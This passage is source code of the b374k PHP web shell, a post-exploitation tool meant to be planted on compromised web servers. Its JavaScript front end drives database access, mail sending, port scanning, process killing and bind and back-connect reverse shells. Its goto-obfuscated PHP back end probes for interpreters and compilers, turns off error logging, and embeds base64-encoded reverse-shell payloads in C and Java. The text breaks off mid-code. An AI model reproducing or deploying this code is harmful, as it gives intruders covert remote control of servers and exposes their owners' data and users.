	dbPort = $('#dbPort').val();
	send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort}, function(res){
		if(res!='error'){
			$('#dbNav').html(res);
			$('.dbHostRow').hide();
			$('.dbUserRow').hide();
			$('.dbPassRow').hide();
			$('.dbPortRow').hide();
			$('.dbConnectRow').hide();
			$('.dbQueryRow').show();
			$('#dbBottom').show();
			db_nav_bind();
		}
		else $('.dbError').html('Unable to connect');
	});
}

function db_disconnect(){
	$('.dbHostRow').show();
	$('.dbUserRow').show();
	$('.dbPassRow').show();
	$('.dbPortRow').show();
	$('.dbConnectRow').show();
	$('.dbQueryRow').hide();
	$('#dbNav').html('');
	$('#dbResult').html('');
	$('#dbBottom').hide();
}

function db_run(){
	dbType = $('#dbType').val();
	dbHost = $('#dbHost').val();
	dbUser = $('#dbUser').val();
	dbPass = $('#dbPass').val();
	dbPort = $('#dbPort').val();
	dbQuery = $('#dbQuery').val();

	if((dbQuery!='')&&(dbQuery!='You can also press ctrl+enter to submit')){
		send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:dbQuery}, function(res){
			if(res!='error'){
				$('#dbResult').html(res);
				$('.tblResult').each(function(){
					sorttable.k(this);
				});
			}
		});
	}
}

function db_query_tbl(type, db, table, start, limit){
	dbType = $('#dbType').val();
	dbHost = $('#dbHost').val();
	dbUser = $('#dbUser').val();
	dbPass = $('#dbPass').val();
	dbPort = $('#dbPort').val();

	send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:'', dbDB:db, dbTable:table, dbStart:start, dbLimit:limit}, function(res){
		if(res!='error'){
			$('#dbResult').html(res);
			$('.tblResult').each(function(){
				sorttable.k(this);
			});
		}
	});
}

function db_pagination(type){
	db = $('#dbDB').val();
	table = $('#dbTable').val();
	start = parseInt($('#dbStart').val());
	limit = parseInt($('#dbLimit').val());
	dbType = $('#dbType').val();

	if(type=='next'){
		start = start+limit;
	}
	else if(type=='prev'){
		start = start-limit;
		if(start<0) start = 0;
	}
	db_query_tbl(dbType, db, table, start, limit);
}

Zepto(function($){
	info_init();

});

function info_init(){
	if((infoResult = localStorage.getItem('infoResult'))){
		$('.infoResult').html(infoResult);
	}
	else{
		info_refresh();
	}
}

function info_toggle(id){
	$('#'+id).toggle();
}

function info_refresh(){
	send_post({infoRefresh:'infoRefresh'}, function(res){
		$('.infoResult').html(res);
		localStorage.setItem('infoResult', res);
	});
}

Zepto(function($){

});

function mail_send(){
	mailFrom = $.trim($('#mailFrom').val());
	mailTo = $.trim($('#mailTo').val());
	mailSubject = $.trim($('#mailSubject').val());
	mailContent = $('#mailContent').val();
	mailAttachment = '';
	if($('.mailAttachment')){
		mailAttachment = $('.mailAttachment').map(function(){ return this.value; }).get().join('{[|b374k|]}');
	}

	send_post({mailFrom:mailFrom, mailTo:mailTo, mailSubject:mailSubject, mailContent:mailContent, mailAttachment:mailAttachment}, function(res){
		$('#mailResult').html(res);
	});
}

function mail_attach(){
	content = "<tr><td>Local file <a onclick=\"$(this).parent().parent().remove();\">(-)</a></td><td colspan='2'><input type='text' class='mailAttachment' value=''></td></tr>";
	$('#mailTBody').append(content);
}

Zepto(function($){
	rs_init();

});

function rs_init(){
	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
		splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('.rsType').append("<option>"+k+"</option>");
		});
	}
	else setTimeout('rs_init()', 1000);

	$('#packetContent').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			packet_go();
		}
		fix_tabchar(this, e);
	});
}

function rs_go_bind(){
	rs_go('bind');
}
function rs_go_back(){
	rs_go('back');
}

function rs_go(rsType){
	rsArgs = "";
	if(rsType=='bind'){
		rsPort = parseInt($('#bindPort').val());
		rsLang = $('#bindLang').val();
		rsArgs = rsPort;
		rsResult = $('#bindResult');
	}
	else if(rsType=='back'){
		rsAddr = $('#backAddr').val();
		rsPort = parseInt($('#backPort').val());
		rsLang = $('#backLang').val();
		rsArgs = rsPort + ' ' + rsAddr;
		rsResult = $('#backResult');
	}

	if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){
		rsResult.html('Invalid port');
		return;
	}

	if(rsArgs!=''){
		send_post({ rsLang:rsLang, rsArgs:rsArgs },
			function(res){
				if(res!='error'){
					splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						output = splits[0]+"<hr>"+splits[1];
						rsResult.html(output);
					}
					else{
						rsResult.html(res);
					}
				}
			}
		);
	}
}

function packet_go(){
	packetHost = $('#packetHost').val();
	packetStartPort = parseInt($('#packetStartPort').val());
	packetEndPort = parseInt($('#packetEndPort').val());
	packetTimeout = parseInt($('#packetTimeout').val());
	packetSTimeout = parseInt($('#packetSTimeout').val());
	packetContent = $('#packetContent').val();
	packetResult = $('#packetResult');
	packetStatus = $('#packetStatus');

	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
		packetResult.html('Invalid start port');
		return;
	}
	if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){
		packetResult.html('Invalid end port');
		return;
	}
	if((isNaN(packetTimeout))||(packetTimeout<=0)){
		packetResult.html('Invalid connection timeout');
		return;
	}
	if((isNaN(packetSTimeout))||(packetSTimeout<=0)){
		packetResult.html('Invalid stream timeout');
		return;
	}

	if(packetStartPort>packetEndPort){
		start = packetEndPort;
		end = packetStartPort;
	}
	else{
		start = packetStartPort;
		end = packetEndPort;
	}

	packetResult.html('');
	while(start<=end){
		packetPort = start++;
		packetResult.append("<hr><div><p class='boxtitle'>Host : "+html_safe(packetHost)+":"+packetPort+"</p><br><div id='packet"+packetPort+"' style='padding:2px 4px;'>Working... please wait...</div></div>");
		packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent);

	}
}

function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent){
	send_post({packetHost:packetHost, packetPort:packetPort, packetEndPort:packetEndPort, packetTimeout:packetTimeout, packetSTimeout:packetSTimeout, packetContent:packetContent}, function(res){
		$('#packet'+packetPort).html(res);
	}, false);
}

Zepto(function($){
	show_processes();
});

function show_processes(){
	send_post({showProcesses:''}, function(res){
		if(res!='error'){
			$('#processes').html(res);
			sorttable.k($('#psTable').get(0));
			ps_bind();
		}
	});
}

function ps_bind(){
	$('.kill').off('click');
	$('.kill').on('click', function(e){
		kill_pid(ps_get_pid($(this)));
	});


	cbox_bind('psTable','ps_update_status');
}

function ps_get_pid(el){
	return el.parent().parent().attr('data-pid');
}

function ps_update_status(){
	totalSelected = $('#psTable').find('.cBoxSelected').not('.cBoxAll').length;
	if(totalSelected==0) $('.psSelected').html('');
	else $('.psSelected').html(' ( '+totalSelected+' item(s) selected )');
}

function kill_selected(){
	buffer = get_all_cbox_selected('psTable', 'ps_get_pid');

	allPid = '';
	$.each(buffer,function(i,v){
		allPid += v + ' ';
	});
	allPid = $.trim(allPid);
	kill_pid(allPid);
}

function kill_pid(allPid){
	title = 'Kill';
	content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='allPid' style='height:120px;min-height:120px;' disabled>"+allPid+"</textarea></td></tr><tr><td colspan='2'><span class='button' onclick=\"kill_pid_go();\">kill</span></td></tr></table>";
	show_box(title, content);
}

function kill_pid_go(){
	allPid = $('.allPid').val();
	if($.trim(allPid)!=''){
		send_post({allPid:allPid}, function(res){
			if(res!='error'){
				$('.boxresult').html(res + ' process(es) killed');
			}
			else $('.boxresult').html('Unable to kill process(es)');
			show_processes();
		});
	}
}


<?php  goto LqOAf; UEgIW: ?>' method='post' id='form' target='_blank'></form>
<!--script start-->
<script type='text/javascript'>
var targeturl = '<?php  goto VT6Ak; q8u9z: @ini_set('log_errors', '0'); goto O9zMJ; xwBp3: if (!function_exists('eval_get_supported')) { function eval_get_supported() { goto bm6AQ; wWfsa: $check = strtolower(execute("perl -h")); goto Q4vtv; bm6AQ: $eval_supported = array(); goto yyTJN; E5j0z: $check = strtolower(execute("java -help")); goto t7bzL; yyTJN: $eval_supported[] = "php"; goto lVmy_; cJjrc: $check = strtolower(execute("ruby -h")); goto xjHPB; Q4vtv: if (strpos($check, "usage") !== false) { $eval_supported[] = "perl"; } goto cJjrc; BGrta: if (strpos($check, "usage") !== false) { $eval_supported[] = "python"; } goto wWfsa; t7bzL: if (strpos($check, "usage") !== false) { $check = strtolower(execute("javac -help")); if (strpos($check, "usage") !== false) { $eval_supported[] = "java"; } } goto Cb0n_; LBvKo: if (strpos($check, "usage") !== false) { $eval_supported[] = "node"; } else { $check = strtolower(execute("nodejs -h")); if (strpos($check, "usage") !== false) { $eval_supported[] = "nodejs"; } } goto G2m2J; xjHPB: if (strpos($check, "usage") !== false) { $eval_supported[] = "ruby"; } goto p1TnS; Cb0n_: return implode(",", $eval_supported); goto O_z9i; G2m2J: $check = strtolower(execute("gcc --help")); goto KYDXH; p1TnS: $check = strtolower(execute("node -h")); goto LBvKo; lVmy_: $check = strtolower(execute("python -h")); goto BGrta; KYDXH: if (strpos($check, "usage") !== false) { $eval_supported[] = "gcc"; } goto E5j0z; O_z9i: } } goto tnbeJ; zXAdJ: if (!function_exists('sql_num_rows')) { function sql_num_rows($sqltype, $result) { if ($sqltype == 'mysql') { if (class_exists('mysqli_result')) { return $result->mysqli_num_rows; } elseif (function_exists('mysql_num_rows')) { return mysql_num_rows($result); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_num_rows')) { return sqlsrv_num_rows($result); } elseif (function_exists('mssql_num_rows')) { return mssql_num_rows($result); } } elseif ($sqltype == 'pgsql') { return pg_num_rows($result); } elseif ($sqltype == 'oracle') { return oci_num_rows($result); } elseif ($sqltype == 'sqlite3') { $metadata = $result->fetchArray(); if (is_array($metadata)) { return $metadata['count']; } } elseif ($sqltype == 'sqlite') { return sqlite_num_rows($result); } elseif ($sqltype == 'odbc') { return odbc_num_rows($result); } elseif ($sqltype == 'pdo') { return $result->rowCount(); } } } goto IASXg; MyofM: if (!function_exists('sql_query')) { function sql_query($sqltype, $query, $con) { if ($sqltype == 'mysql') { if (class_exists('mysqli')) { return $con->query($query); } elseif (function_exists('mysql_query')) { return mysql_query($query); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_query')) { return sqlsrv_query($con, $query); } elseif (function_exists('mssql_query')) { return mssql_query($query); } } elseif ($sqltype == 'pgsql') { return pg_query($query); } elseif ($sqltype == 'oracle') { return oci_execute(oci_parse($con, $query)); } elseif ($sqltype == 'sqlite3') { return $con->query($query); } elseif ($sqltype == 'sqlite') { return sqlite_query($con, $query); } elseif ($sqltype == 'odbc') { return odbc_exec($con, $query); } elseif ($sqltype == 'pdo') { return $con->query($query); } } } goto zXAdJ; n3Xs3: $GLOBALS['module']['eval']['content'] = "\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='4'><p class='boxtitle'>Eval</p></th></tr>\n</thead>\n<tbody>\n\t<tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr>\n\t\n\t<tr id='evalAdditional'><td colspan='4'>\n\t\t<input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">\n\t\t<input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">\n\t</td></tr>\n\t\n\t<tr>\n\t\t<td style='width:144px;'>\n\t\t\t<select id='evalType'>\n\t\t\t\t\n\t\t\t</select>\n\t\t</td>\n\t\t<td colspan='3'>\n\t\t\t<span id='evalSubmit' style='width:120px;' class='button' onclick=\"eval_go();\">run</span>\t\n\t\t</td>\n\t</tr>\n\t\n\t<tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td</tr>\n</tbody>\n</table>\n"; goto bzIH1; z9Ca8: if (!function_exists('rmdirs')) { function rmdirs($dir, $counter = 0) { goto ls2JI; ls2JI: if (is_dir($dir)) { $dir = realpath($dir) . DIRECTORY_SEPARATOR; } goto AvRgj; M1XJR: return $counter; goto TkdV0; AvRgj: if ($dh = opendir($dir)) { goto dI4_s; dI4_s: while (($f = readdir($dh)) !== false) { if ($f != '.' && $f != '..') { $f = $dir . $f; if (@is_dir($f)) { $counter += rmdirs($f); } else { if (unlink($f)) { $counter++; } } } } goto Bp551; Bp551: closedir($dh); goto EMa_Z; EMa_Z: if (rmdir($dir)) { $counter++; } goto m0QBC; m0QBC: } goto M1XJR; TkdV0: } } goto lAXQ5; TJYqK: $GLOBALS['module']['terminal']['title'] = "Terminal"; goto PfuhY; Y8p3G: $GLOBALS['resources']['rs_gcc'] = "rVJhb9owEP0Mv8JjU+tQj5C006TSVEKFSWgtRMA0TRuKgmPIqcGOYjNBp/732nFgwLRJk/ohyd27l3f2vXObKFUql9euuwSVructKlbu/PLj1aN9o6ZbfwucZuuEoRupEhCt9PYIKoAvT7Ekg/kJtpWu2uZM/glLQR+ZOsY5U6AfF/gxvuag1Q0GXKFVDBybIC6WlNA0LlBThz+/z5xf9ZopSEKJCLxOvaYPuqYa0M3iJCki4Ag0DAtsfg4C3/xSg5YEHi3iFWTboPspGgz7084ez0WhglQJLnGsBOCylzdznN8Uo92S5adkZngw7PZ646g7/FbSZGDviyt1MhndfY4m03G/+0DalsKU4YhcYanL95GhlMxo3P8y6Rs9ciaIhCcmFlhU/Rf4jXTYBhS2MnPgiRbAJzdHTecMSHvjWVamB8q45n0oUxrElLKyc3t/HK1DScMuhExZlqFrRAXnjCqW/OAN4l9V3GSd+5p7lHiHiW8lt7rpCjfYxowUTfvjh2CjWLHqhBMvOH8Xfu3dnneqqoZ0yChy9Y1cmaL30LBnzYRkmJr4uV5jmWRob+fl69tpFrKMLNGf2Sk/sULsEKJnnelp7ggX3sUhstP+5w4MwnA8mo6i6V248xVXw/6rm9UmnNQcx7lpH25E6aT8DyflceIdJq/vpLROPtdfAA=="; goto x44fm; g5z76: if (!function_exists('show_all_files')) { function show_all_files($path) { goto S9sRR; S0FVj: $output .= "</tr></thead><tbody>"; goto sedxK; sSK3D: $output .= "</tfoot></table>"; goto p5VnR; FkhzC: $totalFolders = 0; goto c3pYy; A2GyA: $output .= "</tbody><tfoot>"; goto VJOVp; aDt2_: $cur = getcwd(); goto Bl6WX; cX6Di: natcasesort($allfiles); goto xmxGb; j8vQA: array_unshift($allfolders, "."); goto aDt2_; JdZ5h: chdir($cur); goto j_z1C; YGZtZ: $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>"; goto ZTvx6; UbnKF: $allfiles = $allfolders = array(); goto FcXov; j_z1C: natcasesort($allfolders); goto cX6Di; p5VnR: return $output; goto iUjta; HpTUQ: foreach ($allfiles as $f) { goto GZXVY; q_HIC: $output .= "</tr>"; goto aEXKa; MwT9w: foreach ($cols as $k => $v) { goto n7vuc; n7vuc: $sortable = ""; goto GoB9V; GoB9V: if ($k == 'modified') { $sortable = " title='" . filemtime($f) . "'"; } goto gmVEo; gmVEo: $output .= "<td" . $sortable . ">" . $v($f) . "</td>"; goto J0Ypp; J0Ypp: } goto q_HIC; GZXVY: $output .= "\n\t<tr data-path=\"" . html_safe(realpath($f)) . "\"><td><div class='cBox'></div></td>\n\t<td style='white-space:normal;'><a class='view'>" . html_safe($f) . "</a><span class='action floatRight'>action</span></td>\n\t<td title='" . filesize($f) . "'>" . get_filesize($f) . "</td>"; goto MwT9w; aEXKa: } goto A2GyA; gxPLA: chdir($path); goto EiTsq; c3pYy: $output .= "<table id='xplTable' class='dataView sortable'><thead>"; goto YGZtZ; VJOVp: $colspan = 1 + count($cols); goto HTKQv; xmxGb: $cols = array(); goto Z2F16; ZTvx6: foreach ($cols as $k => $v) { $output .= "<th class='col-" . $k . "'>" . $k . "</th>"; } goto S0FVj; QNqdw: if (getcwd() != $cur) { array_unshift($allfolders, ".."); } goto JdZ5h; f9BZq: $totalFiles = count($allfiles); goto FkhzC; Bl6WX: chdir(".."); goto QNqdw; HTKQv: $output .= "<tr><td><div class='cBoxAll'></div></td><td>\n\t\t<select id='massAction' class='colSpan'>\n\t\t<option disabled selected>Action</option>\n\t\t<option>cut</option>\n\t\t<option>copy</option>\n\t\t<option>paste</option>\n\t\t<option>delete</option>\n\t\t<option disabled>------------</option>\n\t\t<option>chmod</option>\n\t\t<option>chown</option>\n\t\t<option>touch</option>\n\t\t<option disabled>------------</option>\n\t\t<option>extract (tar)</option>\n\t\t<option>extract (tar.gz)</option>\n\t\t<option>extract (zip)</option>\n\t\t<option disabled>------------</option>\n\t\t<option>compress (tar)</option>\n\t\t<option>compress (tar.gz)</option>\n\t\t<option>compress (zip)</option>\n\t\t<option disabled>------------</option>\n\t\t</select>\n\t\t</td><td colspan='" . $colspan . "'></td></tr>\n\t\t<tr><td></td><td colspan='" . ++$colspan . "'>" . $totalFiles . " file(s), " . $totalFolders . " Folder(s)<span class='xplSelected'></span></td></tr>\n\t\t"; goto sSK3D; S9sRR: if (!is_dir($path)) { return "No such directory : " . $path; } goto gxPLA; sedxK: foreach ($allfolders as $d) { goto sVg_2; yTUls: if ($d == "." || $d == "..") { $action = "actiondot"; $cboxException = " cBoxException"; } else { $action = "actionfolder"; $totalFolders++; } goto B4DZ1; sVg_2: $cboxException = ""; goto yTUls; B4DZ1: $output .= "\n\t<tr data-path=\"" . html_safe(realpath($d) . DIRECTORY_SEPARATOR) . "\"><td><div class='cBox" . $cboxException . "'></div></td>\n\t<td style='white-space:normal;'><a class='navigate'>[ " . html_safe($d) . " ]</a><span class='" . $action . " floatRight'>action</span></td>\n\t<td>DIR</td>"; goto kh3Rq; kh3Rq: foreach ($cols as $k => $v) { goto cR2Nd; cR2Nd: $sortable = ""; goto D3RGu; D3RGu: if ($k == 'modified') { $sortable = " title='" . filemtime($d) . "'"; } goto i_Moe; i_Moe: $output .= "<td" . $sortable . ">" . $v($d) . "</td>"; goto e0bXC; e0bXC: } goto uixJL; uixJL: $output .= "</tr>"; goto r6xuL; r6xuL: } goto HpTUQ; EiTsq: $output = ""; goto UbnKF; FcXov: if ($res = opendir($path)) { while ($file = readdir($res)) { if ($file != '.' && $file != "..") { if (is_dir($file)) { $allfolders[] = $file; } elseif (is_file($file)) { $allfiles[] = $file; } } } } goto j8vQA; Z2F16: if (is_win()) { $cols = array("perms" => "get_fileperms", "modified" => "get_filemtime"); } else { $cols = array("owner" => "get_fileowner", "perms" => "get_fileperms", "modified" => "get_filemtime"); } goto f9BZq; iUjta: } } goto xwBp3; u0hFY: auth(); goto JxDMP; x44fm: $GLOBALS['resources']['rs_java'] = "lVRNb9swDD2nQP+D4JM9BHaTDdjWIsOwYYcBAzosvXXBICuMrdWWBYnOB9L891Gy7LhrLz1Ekcgn8vGRcpaxElHb6ywrJJZtnoqmzvK37989dOvlhax1Y5D95VueyiZ9c/PUpAC97fJCt3klBRMVt5b5y3+MPV5eTLSRW47ALHIkwEYqXgWYRgZ7BLW27K40wNcOP1z4rnSLSyR7zaS9GbtuWzz7mhY9A3J3HDTGT+9On11IjlhKm0q7oMh+S8aFi3TqQn2+3YIxcg2juNtGrplpVZx4nhM0h24zyQ8I9yuWswVTsGP++GH2cb666fxSIRPkpDyuzDhPgmNXygpi8WlxlbAQa0Is0p2RCHE+vZqKHurtm6q1ZTyYXox58n/dKjiKMv62F6BRNopBcoSUVFSkBRcPd4YLoHAe7Jau+lBv6Jgvu+ZSxaSfVAUVyk1hOxFcZW4cfO7Oz0S9Jl5RlkuV2TLyLrmJlweLUKcF4E/TaDB4iKPGporXECUpNj+aHZiv3BKhVKo17G83cbSTKkqcPMcQlf6ijm/ItnNWP3DMllBV7JqJRikQCOvfqss+6s/OEfhCZxtkXDbiAZCVoXfdMfiGDhN9V3NagSqwXCxmYQQm/iksaFYRCjCp5sYCHTz6/mrV92QJhuYppLJ9qpExdoF6tONiUy5c1/pmd/2EygL7n8z8tWQ64aQmrHfNVqPEIxGknrIRr9PLUrDHR/Yyn/ErLKQru3Tqj8zDKD95oEUzYMf2AUz+/oX0JhopAe6TQhd/tQplDe562NJEwR5ETMOThG8FqUWTOwsFk876GbWpI9IncOj5GV24r4p+znCAz1J6Psa1T8+H7VlGv7ziddLv9A8="; goto Wy8A9; RvEBT: if (!function_exists('read_file')) { function read_file($file) { goto YNrB6; TZrK5: if ($fh = @fopen($file, "rb")) { $content = ""; while (!feof($fh)) { $content .= fread($fh, 8192); } } goto BoIpR; YNrB6: $content = false; goto TZrK5; BoIpR: return $content; goto R7lzz; R7lzz: } } goto rIcZ_; uy8kH: $GLOBALS['module']['processes']['content'] = ""; goto HRUIn; fREE1: echo get_resource('b374k'); goto IX9Ms; QIsHJ: if (!function_exists('view_file')) { function view_file($file, $type, $preserveTimestamp = 'true') { goto r81jV; r81jV: $output = ""; goto VZ3uV; Bc2kO: return $output; goto rYucF; VZ3uV: if (is_file($file)) { goto b0Te_; eD0r4: if ($type == "auto") { if (is_array($image_info)) { $type = 'image'; } elseif (!empty($mime)) { $type = "multimedia"; } else { $type = "raw"; } } goto R8Nog; b0Te_: $dir = dirname($file); goto EtD0K; JnQRu: if ($file_ext_pos !== false) { $file_ext = trim(substr($file, $file_ext_pos), "."); if (preg_match("/([^\\s]+)\\ .*\\b" . $file_ext . "\\b.*/i", $mime_list, $res)) { $mime = $res[1]; } } goto eD0r4; h1S40: $output .= "\n\t<table id='viewFile' class='boxtbl'>\n\t<tr><td style='width:120px;'>Filename</td><td>" . html_safe($file) . "</td></tr>\n\t<tr><td>Size</td><td>" . get_filesize($file) . " (" . filesize($file) . ")</td></tr>\n\t" . $owner . "\n\t<tr><td>Permission</td><td>" . get_fileperms($file) . "</td></tr>\n\t<tr><td>Create time</td><td>" . @date("d-M-Y H:i:s", filectime($file)) . "</td></tr>\n\t<tr><td>Last modified</td><td>" . @date("d-M-Y H:i:s", filemtime($file)) . "</td></tr>\n\t<tr><td>Last accessed</td><td>" . @date("d-M-Y H:i:s", fileatime($file)) . "</td></tr>\n\t<tr data-path='" . html_safe($file) . "'><td colspan='2'>\n\t<span class='navigate button' style='width:120px;'>explorer</span>\n\t<span class='action button' style='width:120px;'>action</span>\n\t<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'raw');hide_box();\">raw</span>\n\t<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'code');hide_box();\">code</span>\n\t<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'hex');hide_box();\">hex</span>\n\t<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'image');hide_box();\">image</span>\n\t<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'multimedia');hide_box();\">multimedia</span>\n\t</td></tr>\n\t<tr><td colspan='2'><div id='viewFilecontent'>" . $content . "</div></td></tr>\n\t</table>"; goto b6ceP; x38ii: $file_ext_pos = strrpos($file, "."); goto JnQRu; R8Nog: $content = ""; goto pAKdR; llYXR: if (!is_win()) { $owner = "<tr><td>Owner</td><td>" . get_fileowner($file) . "</td></tr>"; } goto YhjFU; pAKdR: if ($type == "code") { goto YNkzg; KBMzu: foreach ($hl_arr as $k => $v) { $content = str_replace("<font color=\"" . $v . "\">", "<font class='" . $k . "'>", $content); $content = str_replace("<span style=\"color: " . $v . "\">", "<span class='" . $k . "'>", $content); } goto daRiQ; AY_aR: $content = highlight_string(read_file($file), true); goto KBMzu; YNkzg: $hl_arr = array("hl_default" => ini_get('highlight.default'), "hl_keyword" => ini_get('highlight.keyword'), "hl_string" => ini_get('highlight.string'), "hl_html" => ini_get('highlight.html'), "hl_comment" => ini_get('highlight.comment')); goto AY_aR; daRiQ: } elseif ($type == "image") { goto PdVdB; sMsur: $height = (int) $image_info[1]; goto iejkq; PdVdB: $width = (int) $image_info[0]; goto sMsur; QUBmk: $content = "<center>" . $image_info_h . "<br>" . $imglink . "\n\t\t\t\t\t<img id='viewImage' style='width:" . $width . "px;' src='data:" . $image_info['mime'] . ";base64," . base64_encode(read_file($file)) . "' alt='" . $file . "'></center>\n\t"; goto H0pRF; iejkq: $image_info_h = "Image type = <span class='strong'>(</span> " . $image_info['mime'] . " <span class='strong'>)</span><br>\n\t\t\t\t\tImage Size = <span class='strong'>( </span>" . $width . " x " . $height . "<span class='strong'> )</span><br>"; goto lgp1p; lgp1p: if ($width > 800) { $width = 800; $imglink = "<p><a id='viewFullsize'>\n\t\t\t\t\t<span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>"; } else { $imglink = ""; } goto QUBmk; H0pRF: } elseif ($type == "multimedia") { $content = "<center>\n\t\t\t\t\t\t\t<video controls>\n\t\t\t\t\t\t\t<source src='' type='" . $mime . "'>\n\n\t\t\t\t\t\t\t</video>\n\t\t\t\t\t\t\t<p><span class='button' onclick=\"multimedia('" . html_safe(addslashes($file)) . "');\">Load Multimedia File</span></p>\n\t\t\t\t\t\t\t</center>"; } elseif ($type == "edit") { $preservecbox = $preserveTimestamp == 'true' ? " cBoxSelected" : ""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">" . html_safe(read_file($file)) . "</textarea></td></tr></table>"; } elseif ($type == "hex") { $preservecbox = $preserveTimestamp == 'true' ? " cBoxSelected" : ""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">" . bin2hex(read_file($file)) . "</textarea></td></tr></table>"; } else { $content = "<pre>" . html_safe(read_file($file)) . "</pre>"; } goto h1S40; tdOPB: $mime = ""; goto x38ii; YhjFU: $image_info = @getimagesize($file); goto qoWdz; EtD0K: $owner = ""; goto llYXR; qoWdz: $mime_list = get_resource('mime'); goto tdOPB; b6ceP: } else { $output = "error"; } goto Bc2kO; rYucF: } } goto PvIxr; n5vWi: $GLOBALS['module']['processes']['title'] = "Processes"; goto JUcn6; UwMw1: if (isset($p['infoRefresh'])) { output(info_getinfo()); } goto RN0d2; ukd2b: $GLOBALS['module']['network']['js_ontabselected'] = ""; goto EmzG3; PvIxr: if (!function_exists('get_writabledir')) { function get_writabledir() { if (is_writable(".")) { return realpath(".") . DIRECTORY_SEPARATOR; } else { goto xI5zu; DoL1t: $tempfile = tempnam(__FILE__, ''); goto Gy0KZ; yShZO: if (function_exists("sys_get_temp_dir")) { $dir = sys_get_temp_dir(); if (is_writable($dir)) { return realpath($dir) . DIRECTORY_SEPARATOR; } } else { if (!is_win()) { if (is_writable("/tmp")) { return "/tmp/"; } } } goto DoL1t; Gy0KZ: if (file_exists($tempfile)) { goto gjydb; cnKV8: return $dir; goto Njzwl; gjydb: $dir = realpath(dirname($tempfile)) . DIRECTORY_SEPARATOR; goto gx9Vb; gx9Vb: unlink($tempfile); goto cnKV8; Njzwl: } goto YosjX; xI5zu: foreach (array('TMP', 'TEMP', 'TMPDIR') as $k) { if (!empty($_ENV[$k])) { if (is_writable($_ENV[$k])) { return realpath($_ENV[$k]) . DIRECTORY_SEPARATOR; } } } goto yShZO; YosjX: } return false; } } goto aOVNQ; aOVNQ: if (!function_exists('get_drives')) { function get_drives() { goto iLVRe; ru2_y: return $drives; goto KbcuW; qB3Ng: $v = $v[0]; goto aU2oX; iLVRe: $drives = ""; goto wOV2V; wOV2V: $v = explode("\\", get_cwd()); goto qB3Ng; aU2oX: foreach (range("A", "Z") as $letter) { if (@is_readable($letter . ":\\")) { goto rYsR4; JFr9h: $drives .= " ]</a> "; goto QxU3E; KF9Px: if ($letter . ":" != $v) { $drives .= $letter; } else { $drives .= "<span class='drive-letter'>" . $letter . "</span>"; } goto JFr9h; rYsR4: $drives .= "<a class='navbar' data-path='" . $letter . ":\\'>[ "; goto KF9Px; QxU3E: } } goto ru2_y; KbcuW: } } goto g5z76; H8aKC: echo get_resource('b374k'); goto vkgk0; HArXi: ?>';
var module_to_load = '<?php  goto lRj0z; K6pNp: if (!function_exists('get_self')) { function get_self() { $query = isset($_SERVER["QUERY_STRING"]) && !empty($_SERVER["QUERY_STRING"]) ? "?" . $_SERVER["QUERY_STRING"] : ""; return html_safe($_SERVER["REQUEST_URI"] . $query); } } goto bpj6x; oXDLk: if (isset($p['showProcesses'])) { goto hX8dU; oL1VE: output('error'); goto xdF2z; aXueW: if ($processes !== false) { output($processes); } goto oL1VE; hX8dU: $processes = show_processes(); goto aXueW; xdF2z: } elseif (isset($p['allPid'])) { goto phH7q; SnMEL: foreach ($allPid as $pid) { $pid = trim($pid); if (!empty($pid)) { if (function_exists("posix_kill")) { if (posix_kill($pid, '9')) { $counter++; } } else { if (is_win()) { goto v6oEo; cN02c: if (strpos($cmd, "No tasks are running") !== false) { $counter++; } goto zWg0M; v6oEo: $cmd = execute("taskkill /F /PID " . $pid); goto 